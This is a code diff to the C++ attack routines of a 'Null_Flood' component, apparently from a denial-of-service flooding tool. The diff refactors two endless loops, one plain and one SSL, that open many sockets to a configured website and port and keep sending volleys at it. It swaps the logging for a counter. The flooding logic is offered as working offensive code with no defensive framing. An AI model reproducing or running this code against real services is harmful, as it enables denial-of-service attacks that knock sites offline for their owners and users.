@@ -3,7 +3,7 @@
 #include <utility>
 #include "../Headers/Null_Flood.hpp"
 
-void Null_Flood::attack(const int *id) {
+void Null_Flood::attack() {
     int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
@@ -12,7 +12,6 @@ void Null_Flood::attack(const int *id) {
     }
     int socktype = conf->protocol;
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
@@ -23,21 +22,17 @@ void Null_Flood::attack(const int *id) {
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
+                }else{
+                    conf->voly++;
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
 
-void Null_Flood::attack_ssl(const int *id) {
+void Null_Flood::attack_ssl() {
     int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
@@ -52,7 +47,6 @@ void Null_Flood::attack_ssl(const int *id) {
         CTXs.emplace_back(nullptr);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
@@ -67,16 +61,12 @@ void Null_Flood::attack_ssl(const int *id) {
             }else{
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
+                }else{
+                    conf->voly++;
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
